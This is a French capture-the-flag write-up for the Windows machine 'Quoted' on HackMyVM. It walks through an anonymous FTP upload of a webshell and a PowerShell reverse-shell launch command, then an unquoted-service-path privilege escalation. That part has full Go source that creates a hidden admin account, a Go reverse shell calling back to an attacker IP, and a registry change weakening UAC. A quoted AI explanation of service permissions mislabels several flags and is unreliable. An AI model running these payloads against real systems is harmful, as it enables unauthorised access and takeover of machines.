---
title: "Solution du CTF Quoted de HackMyVM.eu"
tags: [CTF,HackMyVM,Windows]
---

C'est toujours un plaisir de faire un petit CTF Windows vu que la grande majorité des CTFs est basée sur Linux.

Je me sens toujours empoté avec une ligne de commande Windows, alors il ne faut pas passer à côté d'une chance de s'améliorer :)

### As Soon Pwned

On trouve des ports Windows classiques, mais rien spécifique à un contrôleur de domaine. Pas de WinRM non plus :

```console
$ sudo nmap -T5 --script vuln -sCV -p- 192.168.56.111
Starting Nmap 7.94SVN ( https://nmap.org )
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 192.168.56.111
Host is up (0.00026s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:microsoft:internet_information_services:7.5: 
|       PACKETSTORM:180580      10.0    https://vulners.com/packetstorm/PACKETSTORM:180580      *EXPLOIT*
|       MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-       10.0    https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-        *EXPLOIT*
|       CVE-2010-3972   10.0    https://vulners.com/cve/CVE-2010-3972
|       SSV:20122       9.3     https://vulners.com/seebug/SSV:20122    *EXPLOIT*
|       CVE-2010-2730   9.3     https://vulners.com/cve/CVE-2010-2730
|       SSV:20121       4.3     https://vulners.com/seebug/SSV:20121    *EXPLOIT*
|       PACKETSTORM:180584      4.3     https://vulners.com/packetstorm/PACKETSTORM:180584      *EXPLOIT*
|       MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-    4.3     https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-     *EXPLOIT*
|_      CVE-2010-1899   4.3     https://vulners.com/cve/CVE-2010-1899
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:C3:F9:E5 (Oracle VirtualBox virtual NIC)
Service Info: Host: QUOTED-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 625.42 seconds
```

Je ne parviens pas à lister les partages SMB mais je peux me connecter en anonyme sur le FTP :

```console
$ ftp 192.168.56.111
Connected to 192.168.56.111.
220 Microsoft FTP Service
Name (192.168.56.111:devloop): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
10-05-24  12:16PM       <DIR>          aspnet_client
10-05-24  12:27AM                  689 iisstart.htm
10-05-24  12:27AM               184946 welcome.png
226 Transfer complete.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************************************************************|   368        8.35 MiB/s    00:00 ETA
226 Transfer complete.
368 bytes sent in 00:00 (252.01 KiB/s)
```

On peut uploader des fichiers et le dossier destination correspond à la racine web qui est sur le port 80.

J'ai trouvé ce webshell mais plus tard j'en ai trouvé un autre (pas noté l'URL par contre) : [webshell/asp/webshell.asp at master · tennc/webshell · GitHub](https://github.com/tennc/webshell/blob/master/asp/webshell.asp)

J'ai alors de l'exécution de commande en tant que `nt authority\network service`.

J'ai ensuite uploadé un script de reverse shell en Powershell, trouvé ici :

[GitHub - martinsohn/PowerShell-reverse-shell: Reverse TCP shell in PowerShell for fun. Made in spring 2020 with inspiration from (and a few fixes to) samratashok/nishang Invoke-PowerShellTcp.ps1 and https://cyberwardog.blogspot.com/2016/08/poweshell-encrypt-tcp-client-server.html](https://github.com/MartinSohn/PowerShell-reverse-shell)

Pour l'exécuter c'est l'appel classique :

```bash
powershell -nop -exec bypass c:\inetpub\wwwroot\rev.ps1
```

Avec cet accès je trouve le premier flag sur le bureau de l'utilisateur `Quoted`.

```console
$ sudo ncat -l -p 80 -v
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 192.168.56.111:49162.
SHELL> cd c:/
SHELL> dir

    Directory: C:\

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        05.10.2024     13:23            dotNet Update                     
d----        05.10.2024     00:30            inetpub                           
d----        14.07.2009     06:20            PerfLogs                          
d-r--        05.10.2024     00:12            Program Files                     
d-r--        05.10.2024     00:21            Program Files (x86)               
d-r--        05.10.2024     12:16            Users                             
d----        05.10.2024     00:27            Windows                           

SHELL> cd Users
SHELL> dir

    Directory: C:\Users

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        05.10.2024     00:09            Administrator                     
d----        05.10.2024     12:16            Classic .NET AppPool              
d----        05.10.2024     00:28            DefaultAppPool                    
d-r--        12.04.2011     18:08            Public                            
d----        05.10.2024     00:07            quoted                            

SHELL> cd quoted
SHELL> dir

    Directory: C:\Users\quoted

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d-r--        05.10.2024     00:07            Contacts                          
d-r--        06.10.2024     17:25            Desktop                           
d-r--        05.10.2024     00:07            Documents                         
d-r--        05.10.2024     00:07            Downloads                         
d-r--        05.10.2024     00:07            Favorites                         
d-r--        05.10.2024     00:07            Links                             
d-r--        05.10.2024     00:07            Music                             
d-r--        05.10.2024     00:07            Pictures                          
d-r--        05.10.2024     00:07            Saved Games                       
d-r--        05.10.2024     00:07            Searches                          
d-r--        05.10.2024     00:07            Videos                            

SHELL> cd Desktop
SHELL> dir

    Directory: C:\Users\quoted\Desktop

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        06.10.2024     17:25         23 user.txt                          

SHELL> type user.txt
HMV{User_Flag_Obtained}
```

### Unquoted

Ne tournons pas autour du pot plus longtemps : le CTF s'appelle "quoted" on s'attend donc à une faille du type "unquoted service path".

Pour trouver des services vulnérables, on peut utiliser cette commande pompée sur HackTricks :

```console
SHELL> gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

PathName                   DisplayName                Name                     
--------                   -----------                ----                     
C:\dotNet Update\dotnet... PEService                  PEService
```

On voit que le path `C:\dotNet Update\dotnet...` n'est pas correctement échappé et du coup Windows va d'abord voir s'il n'y a pas un exécutable `c:\dotNet.exe`, considérant le reste comme des arguments.

Tous les utilisateurs du système peuvent écrire dans `C:`, ça c'est classique, mais pourra-t-on démarrer le service ?

```console
SHELL> sc.exe sdshow PEService

D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RPWP;;;NS)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

D'après différentes IA ce ne sera pas possible :
-------------------------------

You've provided the SDDL string for the `PEService` using `sc.exe sdshow PEService`:

`D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RPWP;;;NS)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)`

Let's break down the **DACL (D:)** part, which defines who has what permissions on the service:

- **`(A;;CCLCSWRPWPDTLOCRRC;;;SY)`**:
  
  - `A`: **Allow**
  - `CCLCSWRPWPDTLOCRRC`: This is a combination of many rights. For `SY` (Local System), this essentially grants **Full Control**. This includes:
    - `CC`: `SERVICE_CHANGE_CONFIG` (Change service configuration)
    - `LC`: `SERVICE_QUERY_STATUS` (Query service status)
    - `SW`: `SERVICE_START` (Start the service)
    - `RP`: `SERVICE_STOP` (Stop the service)
    - `WP`: `SERVICE_PAUSE_CONTINUE` (Pause/Continue the service)
    - `DT`: `DELETE` (Delete the service)
    - `LO`: `READ_CONTROL` (Read permissions)
    - `CR`: `WRITE_DAC` (Change permissions)
    - `RC`: `SERVICE_QUERY_CONFIG` (Query service config) - *Note: Some flags might overlap or be redundant in a "Full Control" context.*
  - `SY`: **NT AUTHORITY\SYSTEM** (Local System account)

- **`(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)`**:
  
  - `A`: **Allow**
  - `CCDCLCSWRPWPDTLOCRSDRCWDWO`: Similar to the above, these are extensive rights, granting **Full Control**.
  - `BA`: **BUILTIN\Administrators** (Local Administrators group)

- **`(A;;CCLCSWLOCRRC;;;IU)`**:
  
  - `A`: **Allow**
  - `CCLCSWLOCRRC`:
    - `CC`: `SERVICE_CHANGE_CONFIG` (Change service configuration)
    - `LC`: `SERVICE_QUERY_STATUS` (Query service status)
    - `SW`: `SERVICE_START` (Start the service)
    - `LO`: `READ_CONTROL` (Read permissions)
    - `CR`: `WRITE_DAC` (Change permissions)
    - `RC`: `SERVICE_QUERY_CONFIG` (Query service config)
  - `IU`: **NT AUTHORITY\INTERACTIVE** (Users logged on interactively to the console/session)

- **`(A;;CCLCSWLOCRRC;;;SU)`**:
  
  - `A`: **Allow**
  - `CCLCSWLOCRRC`: Same rights as for `IU` above.
  - `SU`: **NT AUTHORITY\SERVICE** (Service accounts)

- **`(A;;RPWP;;;NS)`**:
  
  - `A`: **Allow**
  - `RP`: `SERVICE_STOP` (Stop the service)
  - `WP`: `SERVICE_PAUSE_CONTINUE` (Pause/Continue the service)
  - `NS`: **NT AUTHORITY\NETWORK SERVICE** (Network Service account)

**Summary of Permissions for `PEService`:**

Based on this SDDL, here's who has control over the `PEService`:

1. **NT AUTHORITY\SYSTEM (Local System):** Has **Full Control**. Can stop, start, configure, and delete the service.
2. **BUILTIN\Administrators (Local Administrators Group):** Has **Full Control**. Any user who is a member of the local Administrators group can stop, start, configure, and delete the service.
3. **NT AUTHORITY\INTERACTIVE (Interactive Users):** Can **Start**, **Query Status**, **Change Configuration**, **Read/Change Permissions**. *Critically, they **cannot stop** the service based on these flags (missing `RP`).*
4. **NT AUTHORITY\SERVICE (Service Accounts):** Has the **same rights as Interactive Users**. They can **Start**, **Query Status**, **Change Configuration**, **Read/Change Permissions**. *They **cannot stop** the service.*
5. **NT AUTHORITY\NETWORK SERVICE:** Can **Stop** (`RP`) and **Pause/Continue** (`WP`) the service.

----------------------------------------

Pourtant, pourtant... Je n'ai pas vraiment d'autres choix ici, alors je tente un `sc start PEService`.

Ce dernier donne des erreurs, mais ne dit pas explicitement que c'est refusé pour permissions.

Serait-ce parce que l'utilisateur courant dispose du privilège `SeImpersonatePrivilege` ?

On va donc placer un binaire à nous sur le chemin `c:\dotNet`. J'étais partis d'abord sur un simple script bat qui rajoute un utilisateur privilégié :

```bash
net user eviluser P4ssw0rd! /add
net localgroup Administrators eviluser /add
```

Mais au lancement du service, première déconvenue : il indique clairement qu'il n'aime pas le format... On va devoir passer par un `.exe`.

J'ai d'abord essayé de passer ces commandes dans un code source C et de le cross-compiler avec [DockCross](https://github.com/dockcross/dockcross) mais ça n'a pas fonctionné.

C'est peut-être aussi parce que j'avais oublié de spécifier le mode `binary` sur le transfert de fichier FTP, envoyant alors des exécutables corrompus... Ce n'est pas la première fois qie ça m'arrive.

Finalement, je suis passé par du code Go. Une fois de plus, j'ai eu une difficulté, car les versions récentes de Go ne supportent plus Windows 7 (plateforme utilisée sur ce CTF).

[Go 1.20 est la dernière version qui fonctionnera sur toutes les versions de Windows 7, 8, Server 2008 et Server 2012, la version 1.21 nécessitera au moins Windows 10 ou Server 2016](https://go.developpez.com/actu/339968/Go-1-20-est-la-derniere-version-qui-fonctionnera-sur-toutes-les-versions-de-Windows-7-8-Server-2008-et-Server-2012-la-version-1-21-necessitera-au-moins-Windows-10-ou-Server-2016/)

Ce code appelle donc les commandes de création d'utilisateur privilégié avec aussi le debug vers un fichier en cas de problèmes :

```go
package main

import (
        "fmt"
        "os"
        "os/exec"
        "syscall"
)

func main() {
        outputFile, err := os.OpenFile("C:\\payload_output.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
        if err != nil {
                return
        }
        defer outputFile.Close()

        // Rediriger stdout et stderr vers le fichier
        os.Stdout = outputFile
        os.Stderr = outputFile

        fmt.Println("--- Début de l'exécution du payload ---")
        fmt.Printf("Heure d'exécution : %s\n", os.Getenv("DATE") + " " + os.Getenv("TIME"))

        newAdminUser := "ctfadmin"
        newAdminPass := "P@ssword123!"

        fmt.Printf("Tentative d'ajout d'un utilisateur privilégié : %s\n", newAdminUser)

        cmd1 := exec.Command("cmd.exe", "/c", "net", "user", newAdminUser, newAdminPass, "/add")
        cmd1.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        output1, err1 := cmd1.CombinedOutput()
        if err1 != nil {
                fmt.Printf("Erreur lors de la création de l'utilisateur '%s' : %v\nSortie : %s\n", newAdminUser, err1, string(output1))
        } else {
                fmt.Printf("Utilisateur '%s' créé avec succès. Sortie : %s\n", newAdminUser, string(output1))
        }

        cmd2 := exec.Command("cmd.exe", "/c", "net", "localgroup", "administrators", newAdminUser, "/add")
        cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        output2, err2 := cmd2.CombinedOutput()
        if err2 != nil {
                fmt.Printf("Erreur lors de l'ajout de '%s' au groupe Administrators : %v\nSortie : %s\n", newAdminUser, err2, string(output2))
        } else {
                fmt.Printf("Utilisateur '%s' ajouté au groupe Administrators avec succès. Sortie : %s\n", newAdminUser, string(output2))
        }

        fmt.Println("--- Fin de l'exécution du script de création d'utilisateur ---")
}
```

Pour le compiler avec la version 1.20 de Go j'utiliser une image docker officielle : 

```bash
docker run --rm -v "$(pwd):/app" golang:1.20 sh -c "cd /app && CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o dotNet.exe main.go"
```

Au lancement du service, toujours une erreur, mais c'est la bonne, car le binaire n'a pas toutes les exigences de Windows pour un service :

```
[SC] StartService BAžARISIZ - 1053:

Hizmet, belirli aralklarla yaplan baŸlama veya denetim iste§ine yant vermedi.

Returned: 0
```

Je peux vérifier ça avec `net user` :

```console
SHELL> net user

\\ Kullanıcı Hesapları

-------------------------------------------------------------------------------
Administrator            ctfadmin                 Guest                    
quoted                   
Komut bir veya daha fazla hata ile tamamlandı.
```

### Highway to shell

J'espérais pouvoir alors me connecter avec `psexec` mais une fois de plus, raté !

```console
$ psexec.py ctfadmin@192.168.56.111
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 192.168.56.111.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```

Déçu par ce manque d'ouverture d'esprit, j'ai écrit un autre code Go qui donne un reverse shell :

```go
package main

import (
        "net"
        "os/exec"
        "syscall" // Pour HideWindow (masquer la fenêtre de console)
        "time"    // Pour la gestion des reconnexions
)

func main() {
        attackerIP := "192.168.56.1"
        attackerPort := "4444"

        shellPath := "cmd.exe" 

        for {
                conn, err := net.Dial("tcp", attackerIP+":"+attackerPort)
                if err != nil {
                        time.Sleep(5 * time.Second)
                        continue
                }

                cmd := exec.Command(shellPath)
                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
                cmd.Stdin = conn
                cmd.Stdout = conn
                cmd.Stderr = conn

                _ = cmd.Run() 

                conn.Close()
                time.Sleep(5 * time.Second)
        }
}
```

Je le fais lancer via PEService comme précédemment :

```console
$ ncat -l -p 4444 -v
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.111:49160.
Microsoft Windows [S�r�m 6.1.7601]
Telif Hakk� (c) 2009 Microsoft Corporation. T�m haklar� sakl�d�r.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd c:/users/administrator/desktop
c:\Users\Administrator\Desktop>dir
 C s�r�c�s�ndeki birimin etiketi yok.
 Birim Seri Numaras�: D4DC-8644

 c:\Users\Administrator\Desktop dizini

05.10.2024  18:23    <DIR>          .
05.10.2024  18:23    <DIR>          ..
06.10.2024  17:26                25 root.txt
               1 Dosya               25 bayt
               2 Dizin   22.133.755.904 bayt bo�

c:\Users\Administrator\Desktop>type root.txt
HMV{Elevated_Shell_Again}
```

Cette fois, c'est bon.

D'après HackTrics, la raison derrière se blocage serait UAC : [UAC - User Account Control - HackTricks](https://book.hacktricks.wiki/fr/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html?highlight=LocalAccountTokenFilterPolicy#check-uac)

> Ensuite, vous devez examiner la valeur de **`LocalAccountTokenFilterPolicy`**  
> Si la valeur est **`0`**, alors, seul l'utilisateur **RID 500** (**Administrateur intégré**) peut effectuer des **tâches administratives sans UAC**, et si c'est `1`, **tous les comptes dans le groupe "Administrateurs"** peuvent le faire.

J'ai donc modifié la clé de registre :

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

Et j'ai pu confirmer qu'après ça fonctionnait.

Si cette valeur était déjà à 1, on aurait pu se servir du compte `quoted`. En effet si on utilise cette commande :

```bash
wmic UserAccount get Name,PasswordRequired
```

On découvre que cet utilisateur ne dispose pas de mot de passe :

```
Name           PasswordRequired
Administrator  TRUE
Guest          FALSE
quoted         FALSE
```
